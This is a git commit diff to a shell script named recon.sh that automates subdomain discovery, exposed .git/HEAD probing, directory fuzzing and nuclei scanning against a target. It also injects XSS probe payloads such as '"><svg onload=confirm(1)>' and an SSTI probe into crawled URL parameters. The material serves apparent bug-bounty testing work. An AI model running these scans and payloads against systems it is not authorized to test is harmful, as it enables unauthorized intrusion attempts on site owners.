c25c430d4cc8e952689b9d2a69a3b254c0c80c0b
EdioPaul <ediopaulo.ep@outlook.com>
2023-12-22 14:17:03 -0300

    update

--- recon.sh
+++ recon.sh
@@ -63,7 +63,7 @@ echo
 echo ================"INIT SUBFINDER"================ | anew subfinder
 echo
 echo
-subfinder -d $(cat url) -silent -all | httpx-toolkit -silent -sc -t 1000 | anew subfinder;
+subfinder -d $url -silent -all | httpx-toolkit -silent -sc -t 1000 | anew subfinder;
 echo
 echo
 echo
@@ -104,7 +104,31 @@ echo
 echo ================"INIT WAYBACKROBOTS"================ | anew wayROBOTS
 echo
 echo
-cat subfinder | waybackrobots -d $(cat url) -raw | anew wayROBOTS;
+cat subfinder | waybackrobots -d $url -raw | anew wayROBOTS;
+echo
+echo
+echo
+
+echo ================"INIT CRTSH"================ | anew crtsh
+echo
+echo
+curl -s "https://crt.sh/?q=$url&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx-toolkit -title -silent | anew crtsh;
+echo
+echo
+echo
+
+echo ================"INIT /.git/HEAD1"================ | anew gitHEAD1
+echo
+echo
+curl -s "https://crt.sh/?q=$url&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx-toolkit -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew gitHEAD1
+echo
+echo
+echo
+
+echo ================"INIT /.git/HEAD2"================ | anew gitHEAD2
+echo
+echo
+curl -s "https://crt.sh/?q=$url&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx-toolkit -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew gitHEAD2;
 echo
 echo
 echo
@@ -112,7 +136,16 @@ echo
 echo ================"INIT WHATWEB"================ | anew whatweb
 echo
 echo
-whatweb $(cat url) | anew whatweb;
+whatweb $url | anew whatweb;
+echo
+echo
+echo
+
+
+echo ================"INIT FFUF"================ | anew ffuf
+echo
+echo
+ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u https://$url/FUZZ -mc all -c -v | anew ffuf;
 echo
 echo
 echo
@@ -120,7 +153,15 @@ echo
 echo ================"INIT SSTI"================ | anew ssti2
 echo
 echo
-echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | egrep -v 'Not' | anew ssti2;
+echo $url | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | egrep -v 'Not' | anew ssti2;
+echo
+echo
+echo
+
+echo ================"INIT XSSTRIKE"================ | anew xsstrike
+echo
+echo
+python3 ../xsstrike.py -u $url | anew xsstrike;
 echo
 echo
 echo
@@ -128,7 +169,7 @@ echo
 echo ================"INIT XSS1"================ | anew xss1
 echo
 echo
-echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
+echo $url | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
 echo
 echo
 echo
@@ -136,7 +177,7 @@ echo
 echo ================"INIT XSS2"================ | anew xss2
 echo
 echo
-echo $(cat url) | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
+echo $url | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
 echo
 echo
 echo
@@ -144,7 +185,7 @@ echo
 echo ================"INIT XSS3"================ | anew xss3
 echo
 echo
-echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
+echo $url | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
 echo
 echo
 echo
@@ -152,7 +193,7 @@ echo
 echo ================"INIT XSS4"================ | anew xss4
 echo
 echo
-gau $(cat url) | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
+gau $url | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
 echo
 echo
 echo
@@ -160,7 +201,7 @@ echo
 echo ================"INIT NUCLEI"================ | anew nuclei
 echo
 echo
-echo $(cat url) | subfinder -silent | httpx-toolkit -p 80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672 | nuclei -severity low,medium,high,critical | anew nuclei;
+echo $url | subfinder -silent | httpx-toolkit -p 80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672 | nuclei -severity low,medium,high,critical | anew nuclei;
 echo
 echo
 echo
